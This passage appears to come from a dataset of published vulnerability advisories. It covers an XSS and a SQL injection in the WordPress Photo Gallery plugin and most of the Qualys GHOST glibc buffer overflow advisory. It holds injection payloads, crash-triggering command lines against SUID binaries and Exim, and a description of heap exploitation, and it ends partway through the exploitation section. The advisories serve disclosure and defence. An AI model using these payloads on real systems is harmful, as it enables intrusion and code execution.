http://127.0.0.1/wordpress/wp-admin/admin-ajax.php?action=addImages&width=700&height=550&extensions=jpg,jpeg,png,gif&callback=bwg_add_preview_image&sort_by=name""><script>alert(1)<%2fscript>
----------------------------------------------------------------
Impact:
User of the Wordpress Backend can be attacked through the XSS vulnerability, when an attacker is exploiting the various vulnerable parameters. Therefore an attacker could execute for example Website Spoofing or Inject malicious JavaScript code in order to use attacking tools like BeEF.
----------------------------------------------------------------
Solution:
Update to the latest version, which is 1.2.11, see https://wordpress.org/plugins/photo-gallery/.
----------------------------------------------------------------
Timeline:
Vulnerability found: 20.01.2015
Vendor informed: 21.01.2015
Response by vendor: 23.01.2015
Fix by vendor 25.01.2015
Public Advisory: 28.01.2015
----------------------------------------------------------------
Regards,
Sven Schleier"
5483,[CVE-2015-1393] Photo Gallery (Wordpress Plugin) - SQL Injection in Version 1.2.8,,CVE-2015-1393,"[CVE-2015-1393] Photo Gallery (Wordpress Plugin) - SQL Injection in Version 1.2.8
----------------------------------------------------------------
Product Information:
Software: Photo Gallery (Wordpress Plugin)
Tested Version: 1.2.8, released on 15.01.2015 and has over half a million downloads.
Vulnerability Type: SQL Injection (CWE-89)
Download link to tested version: https://downloads.wordpress.org/plugin/photo-gallery.1.2.8.zip
Description: Photo Gallery is an advanced plugin with a list of tools and options for adding and editing images for different views. It is fully responsive. The product includes plugin for adding image galleries and albums to posts and pages, as well as multiple widgets. You can add images, providing detailed descriptions and tags, organize the galleries into different albums. (copied from https://wordpress.org/plugins/photo-gallery/)
----------------------------------------------------------------
Vulnerability description:
When an authenticated user is creating a new gallery a POST-request is sent to the application that is prone to SQL-Injection in the parameter ""asc_or_desc"".
POST /wordpress/wp-admin/admin.php?page=galleries_bwg HTTP/1.1
Host: <IP>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Cookie: <Wordpress-Cookie>
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 150
search_value=&page_number=1&search_or_not=&task=add&current_id=&ids_string=&asc_or_desc=asc&order_by=order
The parameter asc_or_desc in the POST body is prone to a AND/OR time-based blind SQL-Injection. WIth the following payload a delay can be provoked in the request of additional 10 seconds:
asc_or_desc=asc%2c(select%20*%20from%20(select(sleep(10)))a)
----------------------------------------------------------------
Impact:
Direct database access will be possible if an attacker is exploiting the SQL Injection vulnerability.
----------------------------------------------------------------
Solution:
Update to the latest version, which is 1.2.11, see https://wordpress.org/plugins/photo-gallery/.
----------------------------------------------------------------
Timeline:
Vulnerability found: 20.01.2015
Vendor informed: 21.01.2015
Response by vendor: 23.01.2015
Fix by vendor 25.01.2015
Public Advisory: 28.01.2015
----------------------------------------------------------------
Regards,
Sven Schleier"
5493,Qualys Security Advisory CVE-2015-0235 - GHOST: glibc gethostbyname buffer overflow,,CVE-2015-0235,"Qualys Security Advisory CVE-2015-0235
GHOST: glibc gethostbyname buffer overflow
--[ Contents ]----------------------------------------------------------------
1 - Summary
2 - Analysis
3 - Mitigating factors
4 - Case studies
5 - Exploitation
6 - Acknowledgments
--[ 1 - Summary ]-------------------------------------------------------------
During a code audit performed internally at Qualys, we discovered a
buffer overflow in the __nss_hostname_digits_dots() function of the GNU
C Library (glibc). This bug is reachable both locally and remotely via
the gethostbyname*() functions, so we decided to analyze it -- and its
impact -- thoroughly, and named this vulnerability ""GHOST"".
Our main conclusions are:
- Via gethostbyname() or gethostbyname2(), the overflowed buffer is
located in the heap. Via gethostbyname_r() or gethostbyname2_r(), the
overflowed buffer is caller-supplied (and may therefore be located in
the heap, stack, .data, .bss, etc; however, we have seen no such call
in practice).
- At most sizeof(char *) bytes can be overwritten (ie, 4 bytes on 32-bit
machines, and 8 bytes on 64-bit machines). Bytes can be overwritten
only with digits ('0'...'9'), dots ('.'), and a terminating null
character ('').
- Despite these limitations, arbitrary code execution can be achieved.
As a proof of concept, we developed a full-fledged remote exploit
against the Exim mail server, bypassing all existing protections
(ASLR, PIE, and NX) on both 32-bit and 64-bit machines. We will
publish our exploit as a Metasploit module in the near future.
- The first vulnerable version of the GNU C Library is glibc-2.2,
released on November 10, 2000.
- We identified a number of factors that mitigate the impact of this
bug. In particular, we discovered that it was fixed on May 21, 2013
(between the releases of glibc-2.17 and glibc-2.18). Unfortunately, it
was not recognized as a security threat; as a result, most stable and
long-term-support distributions were left exposed (and still are):
Debian 7 (wheezy), Red Hat Enterprise Linux 6 & 7, CentOS 6 & 7,
Ubuntu 12.04, for example.
--[ 2 - Analysis ]------------------------------------------------------------
The vulnerable function, __nss_hostname_digits_dots(), is called
internally by the glibc in nss/getXXbyYY.c (the non-reentrant version)
and nss/getXXbyYY_r.c (the reentrant version). However, the calls are
surrounded by #ifdef HANDLE_DIGITS_DOTS, a macro defined only in:
- inet/gethstbynm.c
- inet/gethstbynm2.c
- inet/gethstbynm_r.c
- inet/gethstbynm2_r.c
- nscd/gethstbynm3_r.c
These files implement the gethostbyname*() family, and hence the only
way to reach __nss_hostname_digits_dots() and its buffer overflow. The
purpose of this function is to avoid expensive DNS lookups if the
hostname argument is already an IPv4 or IPv6 address.
The code below comes from glibc-2.17:
35 int
36 __nss_hostname_digits_dots (const char *name, struct hostent *resbuf,
37 char **buffer, size_t *buffer_size,
38 size_t buflen, struct hostent **result,
39 enum nss_status *status, int af, int *h_errnop)
40 {
..
57 if (isdigit (name[0]) || isxdigit (name[0]) || name[0] == ':')
58 {
59 const char *cp;
60 char *hostname;
61 typedef unsigned char host_addr_t[16];
62 host_addr_t *host_addr;
63 typedef char *host_addr_list_t[2];
64 host_addr_list_t *h_addr_ptrs;
65 char **h_alias_ptr;
66 size_t size_needed;
..
85 size_needed = (sizeof (*host_addr)
86 + sizeof (*h_addr_ptrs) + strlen (name) + 1);
87
88 if (buffer_size == NULL)
89 {
90 if (buflen < size_needed)
91 {
..
95 goto done;
96 }
97 }
98 else if (buffer_size != NULL && *buffer_size < size_needed)
99 {
100 char *new_buf;
101 *buffer_size = size_needed;
102 new_buf = (char *) realloc (*buffer, *buffer_size);
103
104 if (new_buf == NULL)
105 {
...
114 goto done;
115 }
116 *buffer = new_buf;
117 }
...
121 host_addr = (host_addr_t *) *buffer;
122 h_addr_ptrs = (host_addr_list_t *)
123 ((char *) host_addr + sizeof (*host_addr));
124 h_alias_ptr = (char **) ((char *) h_addr_ptrs + sizeof (*h_addr_ptrs));
125 hostname = (char *) h_alias_ptr + sizeof (*h_alias_ptr);
126
127 if (isdigit (name[0]))
128 {
129 for (cp = name;; ++cp)
130 {
131 if (*cp == '')
132 {
133 int ok;
134
135 if (*--cp == '.')
136 break;
...
142 if (af == AF_INET)
143 ok = __inet_aton (name, (struct in_addr *) host_addr);
144 else
145 {
146 assert (af == AF_INET6);
147 ok = inet_pton (af, name, host_addr) > 0;
148 }
149 if (! ok)
150 {
...
154 goto done;
155 }
156
157 resbuf->h_name = strcpy (hostname, name);
...
194 goto done;
195 }
196
197 if (!isdigit (*cp) && *cp != '.')
198 break;
199 }
200 }
...
Lines 85-86 compute the size_needed to store three (3) distinct entities
in buffer: host_addr, h_addr_ptrs, and name (the hostname). Lines 88-117
make sure the buffer is large enough: lines 88-97 correspond to the
reentrant case, lines 98-117 to the non-reentrant case.
Lines 121-125 prepare pointers to store four (4) distinct entities in
buffer: host_addr, h_addr_ptrs, h_alias_ptr, and hostname. The sizeof
(*h_alias_ptr) -- the size of a char pointer -- is missing from the
computation of size_needed.
The strcpy() on line 157 should therefore allow us to write past the end
of buffer, at most (depending on strlen(name) and alignment) 4 bytes on
32-bit machines, or 8 bytes on 64-bit machines. There is a similar
strcpy() after line 200, but no buffer overflow:
236 size_needed = (sizeof (*host_addr)
237 + sizeof (*h_addr_ptrs) + strlen (name) + 1);
...
267 host_addr = (host_addr_t *) *buffer;
268 h_addr_ptrs = (host_addr_list_t *)
269 ((char *) host_addr + sizeof (*host_addr));
270 hostname = (char *) h_addr_ptrs + sizeof (*h_addr_ptrs);
...
289 resbuf->h_name = strcpy (hostname, name);
In order to reach the overflow at line 157, the hostname argument must
meet the following requirements:
- Its first character must be a digit (line 127).
- Its last character must not be a dot (line 135).
- It must comprise only digits and dots (line 197) (we call this the
""digits-and-dots"" requirement).
- It must be long enough to overflow the buffer. For example, the
non-reentrant gethostbyname*() functions initially allocate their
buffer with a call to malloc(1024) (the ""1-KB"" requirement).
- It must be successfully parsed as an IPv4 address by inet_aton() (line
143), or as an IPv6 address by inet_pton() (line 147). Upon careful
analysis of these two functions, we can further refine this
""inet-aton"" requirement:
. It is impossible to successfully parse a ""digits-and-dots"" hostname
as an IPv6 address with inet_pton() (':' is forbidden). Hence it is
impossible to reach the overflow with calls to gethostbyname2() or
gethostbyname2_r() if the address family argument is AF_INET6.
. Conclusion: inet_aton() is the only option, and the hostname must
have one of the following forms: ""a.b.c.d"", ""a.b.c"", ""a.b"", or ""a"",
where a, b, c, d must be unsigned integers, at most 0xfffffffful,
converted successfully (ie, no integer overflow) by strtoul() in
decimal or octal (but not hexadecimal, because 'x' and 'X' are
forbidden).
--[ 3 - Mitigating factors ]--------------------------------------------------
The impact of this bug is reduced significantly by the following
reasons:
- A patch already exists (since May 21, 2013), and has been applied and
tested since glibc-2.18, released on August 12, 2013:
[BZ #15014]
* nss/getXXbyYY_r.c (INTERNAL (REENTRANT_NAME))
[HANDLE_DIGITS_DOTS]: Set any_service when digits-dots parsing was
successful.
* nss/digits_dots.c (__nss_hostname_digits_dots): Remove
redundant variable declarations and reallocation of buffer when
parsing as IPv6 address. Always set NSS status when called from
reentrant functions. Use NETDB_INTERNAL instead of TRY_AGAIN when
buffer too small. Correct computation of needed size.
* nss/Makefile (tests): Add test-digits-dots.
* nss/test-digits-dots.c: New test.
- The gethostbyname*() functions are obsolete; with the advent of IPv6,
recent applications use getaddrinfo() instead.
- Many programs, especially SUID binaries reachable locally, use
gethostbyname() if, and only if, a preliminary call to inet_aton()
fails. However, a subsequent call must also succeed (the ""inet-aton""
requirement) in order to reach the overflow: this is impossible, and
such programs are therefore safe.
- Most of the other programs, especially servers reachable remotely, use
gethostbyname() to perform forward-confirmed reverse DNS (FCrDNS, also
known as full-circle reverse DNS) checks. These programs are generally
safe, because the hostname passed to gethostbyname() has normally been
pre-validated by DNS software:
. ""a string of labels each containing up to 63 8-bit octets, separated
by dots, and with a maximum total of 255 octets."" This makes it
impossible to satisfy the ""1-KB"" requirement.
. Actually, glibc's DNS resolver can produce hostnames of up to
(almost) 1025 characters (in case of bit-string labels, and special
or non-printable characters). But this introduces backslashes ('\')
and makes it impossible to satisfy the ""digits-and-dots""
requirement.
--[ 4 - Case studies ]--------------------------------------------------------
In this section, we will analyze real-world examples of programs that
call the gethostbyname*() functions, but we first introduce a small test
program that checks whether a system is vulnerable or not:
[user@fedora-19 ~]$ cat > GHOST.c << EOF
#include <netdb.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#define CANARY ""in_the_coal_mine""
struct {
char buffer[1024];
char canary[sizeof(CANARY)];
} temp = { ""buffer"", CANARY };
int main(void) {
struct hostent resbuf;
struct hostent *result;
int herrno;
int retval;
/*** strlen (name) = size_needed - sizeof (*host_addr) - sizeof (*h_addr_ptrs) - 1; ***/
size_t len = sizeof(temp.buffer) - 16*sizeof(unsigned char) - 2*sizeof(char *) - 1;
char name[sizeof(temp.buffer)];
memset(name, '0', len);
name[len] = '';
retval = gethostbyname_r(name, &resbuf, temp.buffer, sizeof(temp.buffer), &result, &herrno);
if (strcmp(temp.canary, CANARY) != 0) {
puts(""vulnerable"");
exit(EXIT_SUCCESS);
}
if (retval == ERANGE) {
puts(""not vulnerable"");
exit(EXIT_SUCCESS);
}
puts(""should not happen"");
exit(EXIT_FAILURE);
}
EOF
[user@fedora-19 ~]$ gcc GHOST.c -o GHOST
On Fedora 19 (glibc-2.17):
[user@fedora-19 ~]$ ./GHOST
vulnerable
On Fedora 20 (glibc-2.18):
[user@fedora-20 ~]$ ./GHOST
not vulnerable
----[ 4.1 - The GNU C Library ]-----------------------------------------------
The glibc itself contains a few calls to gethostbyname*() functions. In
particular, getaddrinfo() calls gethostbyname2_r() if, but only if, a
first call to inet_aton() fails: in accordance with the ""inet-aton""
requirement, these internal calls are safe. For example,
eglibc-2.13/sysdeps/posix/getaddrinfo.c:
at->family = AF_UNSPEC;
...
if (__inet_aton (name, (struct in_addr *) at->addr) != 0)
{
if (req->ai_family == AF_UNSPEC || req->ai_family == AF_INET)
at->family = AF_INET;
else if (req->ai_family == AF_INET6 && (req->ai_flags & AI_V4MAPPED))
{
...
at->family = AF_INET6;
}
else
return -EAI_ADDRFAMILY;
...
}
...
if (at->family == AF_UNSPEC && (req->ai_flags & AI_NUMERICHOST) == 0)
{
...
size_t tmpbuflen = 512;
char *tmpbuf = alloca (tmpbuflen);
...
rc = __gethostbyname2_r (name, family, &th, tmpbuf,
tmpbuflen, &h, &herrno);
...
}
----[ 4.2 - mount.nfs ]-------------------------------------------------------
Similarly, mount.nfs (a SUID-root binary) is not vulnerable:
if (inet_aton(hostname, &addr->sin_addr))
return 0;
if ((hp = gethostbyname(hostname)) == NULL) {
nfs_error(_(""%s: can't get address for %s ""),
progname, hostname);
return -1;
}
----[ 4.3 - mtr ]-------------------------------------------------------------
mtr (another SUID-root binary) is not vulnerable either, because it
calls getaddrinfo() instead of gethostbyname*() functions on any modern
(ie, IPv6-enabled) system:
#ifdef ENABLE_IPV6
/* gethostbyname2() is deprecated so we'll use getaddrinfo() instead. */
...
error = getaddrinfo( Hostname, NULL, &hints, &res );
if ( error ) {
if (error == EAI_SYSTEM)
perror (""Failed to resolve host"");
else
fprintf (stderr, ""Failed to resolve host: %s "", gai_strerror(error));
exit( EXIT_FAILURE );
}
...
#else
host = gethostbyname(Hostname);
if (host == NULL) {
herror(""mtr gethostbyname"");
exit(1);
}
...
#endif
----[ 4.4 - iputils ]---------------------------------------------------------
------[ 4.4.1 - clockdiff ]---------------------------------------------------
clockdiff is vulnerable in a straightforward manner:
hp = gethostbyname(argv[1]);
if (hp == NULL) {
fprintf(stderr, ""clockdiff: %s: host not found "", argv[1]);
exit(1);
}
[user@fedora-19-32b ~]$ ls -l /usr/sbin/clockdiff
-rwxr-xr-x. 1 root root 15076 Feb 1 2013 /usr/sbin/clockdiff
[user@fedora-19-32b ~]$ getcap /usr/sbin/clockdiff
/usr/sbin/clockdiff = cap_net_raw+ep
[user@fedora-19-32b ~]$ /usr/sbin/clockdiff `python -c ""print '0' * $((0x10000-16*1-2*4-1-4))""`
.Segmentation fault
[user@fedora-19-32b ~]$ /usr/sbin/clockdiff `python -c ""print '0' * $((0x20000-16*1-2*4-1-4))""`
Segmentation fault
[user@fedora-19-32b ~]$ dmesg
...
[202071.118929] clockdiff[3610]: segfault at b86711f4 ip b75de0c6 sp bfc191f0 error 6 in libc-2.17.so[b7567000+1b8000]
[202086.144336] clockdiff[3618]: segfault at b90d0d24 ip b75bb0c6 sp bf8e9dc0 error 6 in libc-2.17.so[b7544000+1b8000]
------[ 4.4.2 - ping and arping ]---------------------------------------------
ping and arping call gethostbyname() and gethostbyname2(), respectively,
if and only if inet_aton() fails first. This time, however, there is
another function call in between (Fedora, for example, does define
USE_IDN):
--------[ 4.4.2.1 - ping ]----------------------------------------------------
if (inet_aton(target, &whereto.sin_addr) == 1) {
...
} else {
char *idn;
#ifdef USE_IDN
int rc;
...
rc = idna_to_ascii_lz(target, &idn, 0);
if (rc != IDNA_SUCCESS) {
fprintf(stderr, ""ping: IDN encoding failed: %s "", idna_strerror(rc));
exit(2);
}
#else
idn = target;
#endif
hp = gethostbyname(idn);
--------[ 4.4.2.2 - arping ]--------------------------------------------------
if (inet_aton(target, &dst) != 1) {
struct hostent *hp;
char *idn = target;
#ifdef USE_IDN
int rc;
rc = idna_to_ascii_lz(target, &idn, 0);
if (rc != IDNA_SUCCESS) {
fprintf(stderr, ""arping: IDN encoding failed: %s "", idna_strerror(rc));
exit(2);
}
#endif
hp = gethostbyname2(idn, AF_INET);
--------[ 4.4.2.3 - Analysis ]------------------------------------------------
If idna_to_ascii_lz() modifies the target hostname, the first call to
inet_aton() could fail and the second call (internal to gethostbyname())
could succeed. For example, idna_to_ascii_lz() transforms any Unicode
dot-like character (0x3002, 0xFF0E, 0xFF61) into an ASCII dot (""."").
But it also restricts the length of a domain label to 63 characters:
this makes it impossible to reach 1024 bytes (the ""1-KB"" requirement)
with only 4 labels and 3 dots (the ""inet-aton"" requirement).
Unless inet_aton() (actually, strtoul()) can be tricked into accepting
more than 3 dots? Indeed, idna_to_ascii_lz() does not restrict the total
length of a domain name. glibc supports ""thousands' grouping characters""
(man 3 printf); for example, sscanf(str, ""%'lu"", &ul) yields 1000 when
processing any of the following input strings:
- ""1,000"" in an English locale;
- ""1 000"" in a French locale; and
- ""1.000"" in a German or Spanish locale.
strtoul() implements this ""number grouping"" too, but its use is limited
to internal glibc functions. Conclusion: more than 3 dots is impossible,
and neither ping nor arping is vulnerable.
----[ 4.5 - procmail ]--------------------------------------------------------
procmail (a SUID-root and SGID-mail binary) is vulnerable through its
""comsat/biff"" feature:
#define COMSAThost ""localhost"" /* where the biff/comsat daemon lives */
...
#define SERV_ADDRsep '@' /* when overriding in COMSAT=serv@addr */
int setcomsat(chp)const char*chp;
{ char*chad; ...
chad=strchr(chp,SERV_ADDRsep); /* @ separator? */
...
if(chad)
*chad++=''; /* split the specifier */
if(!chad||!*chad) /* no host */
#ifndef IP_localhost /* Is ""localhost"" preresolved? */
chad=COMSAThost; /* nope, use default */
#else /* IP_localhost */
{ ...
}
else
#endif /* IP_localhost */
{ ...
if(!(host=gethostbyname(chad))||!host->h_0addr_list)
user@debian-7-2-32b:~$ ls -l /usr/bin/procmail
-rwsr-sr-x 1 root mail 83912 Jun 6 2012 /usr/bin/procmail
user@debian-7-2-32b:~$ /usr/bin/procmail 'VERBOSE=on' 'COMSAT=@'`python -c ""print '0' * $((0x500-16*1-2*4-1-4))""` < /dev/null
...
*** glibc detected *** /usr/bin/procmail: free(): invalid next size (normal): 0x0980de30 ***
======= Backtrace: =========
/lib/i386-linux-gnu/i686/cmov/libc.so.6(+0x70f01)[0xb76b2f01]
/lib/i386-linux-gnu/i686/cmov/libc.so.6(+0x72768)[0xb76b4768]
/lib/i386-linux-gnu/i686/cmov/libc.so.6(cfree+0x6d)[0xb76b781d]
/usr/bin/procmail[0x80548ec]
/lib/i386-linux-gnu/i686/cmov/libc.so.6(__libc_start_main+0xe6)[0xb7658e46]
/usr/bin/procmail[0x804bb55]
======= Memory map: ========
...
0980a000-0982b000 rw-p 00000000 00:00 0 [heap]
...
Aborted
user@debian-7-2-32b:~$ _COMSAT_='COMSAT=@'`python -c ""print '0' * $((0x500-16*1-2*4-1-4))""`
user@debian-7-2-32b:~$ /usr/bin/procmail ""$_COMSAT_"" ""$_COMSAT_""1234 < /dev/null
Segmentation fault
user@debian-7-2-32b:~$ /usr/bin/procmail ""$_COMSAT_""12345670 ""$_COMSAT_""123456701234 < /dev/null
Segmentation fault
user@debian-7-2-32b:~$ dmesg
...
[211409.564917] procmail[4549]: segfault at c ip b768e5a4 sp bfcb53d8 error 4 in libc-2.13.so[b761c000+15c000]
[211495.820710] procmail[4559]: segfault at b8cb290c ip b763c5a4 sp bf870c98 error 4 in libc-2.13.so[b75ca000+15c000]
----[ 4.6 - pppd ]------------------------------------------------------------
pppd (yet another SUID-root binary) calls gethostbyname() if a
preliminary call to inet_addr() (a simple wrapper around inet_aton())
fails. ""The inet_addr() function converts the Internet host address cp
from IPv4 numbers-and-dots notation into binary data in network byte
order. If the input is invalid, INADDR_NONE (usually -1) is returned.
Use of this function is problematic because -1 is a valid address
(255.255.255.255)."" A failure for inet_addr(), but a success for
inet_aton(), and consequently a path to the buffer overflow.
user@ubuntu-12-04-32b:~$ ls -l /usr/sbin/pppd
-rwsr-xr-- 1 root dip 273272 Feb 3 2011 /usr/sbin/pppd
user@ubuntu-12-04-32b:~$ id
uid=1000(user) gid=1000(user) groups=1000(user),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev)
------[ 4.6.1 - ms-dns option ]-----------------------------------------------
static int
setdnsaddr(argv)
char **argv;
{
u_int32_t dns;
struct hostent *hp;
dns = inet_addr(*argv);
if (dns == (u_int32_t) -1) {
if ((hp = gethostbyname(*argv)) == NULL) {
option_error(""invalid address parameter '%s' for ms-dns option"",
*argv);
return 0;
}
dns = *(u_int32_t *)hp->h_addr;
}
user@ubuntu-12-04-32b:~$ /usr/sbin/pppd 'dryrun' 'ms-dns' `python -c ""print '0' * $((0x1000-16*1-2*4-16-4))""`'377.255.255.255'
*** glibc detected *** /usr/sbin/pppd: free(): invalid next size (normal): 0x09c0f928 ***
======= Backtrace: =========
/lib/i386-linux-gnu/libc.so.6(+0x75ee2)[0xb75e1ee2]
/lib/i386-linux-gnu/libc.so.6(+0x65db5)[0xb75d1db5]
/lib/i386-linux-gnu/libc.so.6(fopen+0x2b)[0xb75d1deb]
/usr/sbin/pppd(options_from_file+0xa8)[0x8064948]
/usr/sbin/pppd(options_for_tty+0xde)[0x8064d7e]
/usr/sbin/pppd(tty_process_extra_options+0xa4)[0x806e1a4]
/usr/sbin/pppd(main+0x1cf)[0x8050b2f]
/lib/i386-linux-gnu/libc.so.6(__libc_start_main+0xf3)[0xb75854d3]
======= Memory map: ========
...
09c0c000-09c2d000 rw-p 00000000 00:00 0 [heap]
...
Aborted (core dumped)
------[ 4.6.2 - ms-wins option ]----------------------------------------------
static int
setwinsaddr(argv)
char **argv;
{
u_int32_t wins;
struct hostent *hp;
wins = inet_addr(*argv);
if (wins == (u_int32_t) -1) {
if ((hp = gethostbyname(*argv)) == NULL) {
option_error(""invalid address parameter '%s' for ms-wins option"",
*argv);
return 0;
}
wins = *(u_int32_t *)hp->h_addr;
}
user@ubuntu-12-04-32b:~$ /usr/sbin/pppd 'dryrun' 'ms-wins' `python -c ""print '0' * $((0x1000-16*1-2*4-16-4))""`'377.255.255.255'
*** glibc detected *** /usr/sbin/pppd: free(): invalid next size (normal): 0x08a64928 ***
======= Backtrace: =========
/lib/i386-linux-gnu/libc.so.6(+0x75ee2)[0xb757aee2]
/lib/i386-linux-gnu/libc.so.6(+0x65db5)[0xb756adb5]
/lib/i386-linux-gnu/libc.so.6(fopen+0x2b)[0xb756adeb]
/usr/sbin/pppd(options_from_file+0xa8)[0x8064948]
/usr/sbin/pppd(options_for_tty+0xde)[0x8064d7e]
/usr/sbin/pppd(tty_process_extra_options+0xa4)[0x806e1a4]
/usr/sbin/pppd(main+0x1cf)[0x8050b2f]
/lib/i386-linux-gnu/libc.so.6(__libc_start_main+0xf3)[0xb751e4d3]
======= Memory map: ========
...
08a61000-08a82000 rw-p 00000000 00:00 0 [heap]
...
Aborted (core dumped)
------[ 4.6.3 - socket option ]-----------------------------------------------
static int
open_socket(dest)
char *dest;
{
char *sep, *endp = NULL;
int sock, port = -1;
u_int32_t host;
struct hostent *hent;
...
sep = strchr(dest, ':');
if (sep != NULL)
port = strtol(sep+1, &endp, 10);
if (port < 0 || endp == sep+1 || sep == dest) {
error(""Can't parse host:port for socket destination"");
return -1;
}
*sep = 0;
host = inet_addr(dest);
if (host == (u_int32_t) -1) {
hent = gethostbyname(dest);
if (hent == NULL) {
error(""%s: unknown host in socket option"", dest);
*sep = ':';
return -1;
}
host = *(u_int32_t *)(hent->h_addr_list[0]);
}
user@ubuntu-12-04-32b:~$ /usr/sbin/pppd 'socket' `python -c ""print '0' * $((0x1000-16*1-2*4-16-4))""`'377.255.255.255:1'
user@ubuntu-12-04-32b:~$ *** glibc detected *** /usr/sbin/pppd: malloc(): memory corruption: 0x09cce270 ***
----[ 4.7 - Exim ]------------------------------------------------------------
The Exim mail server is exploitable remotely if configured to perform
extra security checks on the HELO and EHLO commands (""helo_verify_hosts""
or ""helo_try_verify_hosts"" option, or ""verify = helo"" ACL); we developed
a reliable and fully-functional exploit that bypasses all existing
protections (ASLR, PIE, NX) on 32-bit and 64-bit machines.
user@debian-7-7-64b:~$ grep helo /var/lib/exim4/config.autogenerated | grep verify
helo_verify_hosts = *
user@debian-7-7-64b:~$ python -c ""print '0' * $((0x500-16*1-2*8-1-8))""
000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
user@debian-7-7-64b:~$ telnet 127.0.0.1 25
Trying 127.0.0.1...
Connected to 127.0.0.1.
Escape character is '^]'.
220 debian-7-7-64b ESMTP Exim 4.80 ...
HELO 000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
Connection closed by foreign host.
user@debian-7-7-64b:~$ dmesg
...
[ 1715.842547] exim4[2562]: segfault at 7fabf1f0ecb8 ip 00007fabef31bd04 sp 00007fffb427d5b0 error 6 in libc-2.13.so[7fabef2a2000+182000]
--[ 5 - Exploitation ]--------------------------------------------------------
----[ 5.1 - Code execution ]--------------------------------------------------
In this section, we describe how we achieve remote code execution
against the Exim SMTP mail server, bypassing the NX (No-eXecute)
protection and glibc's malloc hardening.
First, we overflow gethostbyname's heap-based buffer and partially
overwrite the size field of the next contiguous free chunk of memory
with a slightly larger size (we overwrite only 3 bytes of the size
field; in any case, we cannot overflow more than 4 bytes on 32-bit
machines, or 8 bytes on 64-bit machines):
|< malloc_chunk
|
-----|----------------------|---+--------------------|-----
... | gethostbyname buffer |p|s|f|b|F|B| free chunk | ...
-----|----------------------|---+--------------------|-----
| X|
|------------------------->|
overflow
where:
struct malloc_chunk {
INTERNAL_SIZE_T prev_size; /* Size of previous chunk (if free). */
INTERNAL_SIZE_T size; /* Size in bytes, including overhead. */
struct malloc_chunk* fd; /* double links -- used only if free. */
struct malloc_chunk* bk;
/* Only used for large blocks: pointer to next larger size. */
struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */
struct malloc_chunk* bk_nextsize;
};
and: X marks the spot where the crucial memory corruption takes place.
As a result, this artificially-enlarged free chunk, which is managed by
glibc's malloc, overlaps another block of memory, Exim's current_block,
which is managed by Exim's internal memory allocator:
|< malloc_chunk |< storeblock
| |
-----|----------------------|------------------------|---------------+---|-----
... | gethostbyname buffer |p|s|f|b|F|B| free chunk |n|l| current_block | ...
-----|----------------------|------------------------|---------------+---|-----
| |
|<-------------------------------------->|
artificially enlarged free chunk
where:
typedef struct storeblock {
struct storeblock *next;
size_t length;
} storeblock;
Then, we partially allocate the enlarged free chunk and overwrite the
beginning of Exim's current_block of memory (the ""storeblock"" structure)
with arbitrary data. In particular, we overwrite its ""next"" field:
|< malloc_chunk |< storeblock
| |
-----|----------------------|------------------------|--------+----------|-----
... | gethostbyname buffer |p|s|f|b|F|B| aaaaaaaaaa |n|l| current_block | ...
-----|----------------------|------------------------|--------+----------|-----
| X |
|<------------------------------->|
allocated chunk
This effectively turns gethostbyname's buffer overflow into a
write-anything-anywhere primitive, because we control both the pointer
to the next block of memory returned by Exim's allocator (the hijacked
""next"" pointer) and the data allocated (a null-terminated string, the
argument of an SMTP command we send to Exim).
Finally, we use this write-anything-anywhere primitive to overwrite
Exim's run-time configuration, which is cached in the heap memory. More
precisely, we overwrite Exim's Access Control Lists (ACLs), and achieve
arbitrary command execution thanks to Exim's ""${run{<command> <args>}}""
string expansion mechanism:
|< storeblock
|
-----|-------------------------------|---------------|-------------------|-----
... | Exim's run-time configuration | ... .. .. ... |n|l| current_block | ...
-----|----x--------------------------|---------------|x------------------|-----
| |
'<------------------------------------------'
hijacked next pointer
|< ACLs >|
-----|----+-----+--------+------+----|---------------|-------------------|-----
... | Exim's run-time configuration | ... .. .. ... | old current_block | ...
-----|----+-----+--------+------+----|---------------|-------------------|-----
| XXXXXXXX |
|<------------------->|
new current_block
----[ 5.2 - Information leak ]------------------------------------------------
The success of this exploit depends on an important piece of
information: the address of Exim's run-time configuration in the heap.
In this section, we describe how we obtain this address, bypassing the
ASLR (Address Space Layout Randomization) and PIE (Position Independent
Executable) protections.
First, we overflow gethostbyname's heap-based buffer and partially
overwrite the size field of the next contiguous free chunk of memory
with a slightly larger size:
|< malloc_chunk
|
-----|----------------------|---+-------------------------|-----
... | gethostbyname buffer |p|s|f|b|F|B| next free chunk | ...
-----|----------------------|---+-------------------------|-----
| X|
|------------------------->|
overflow
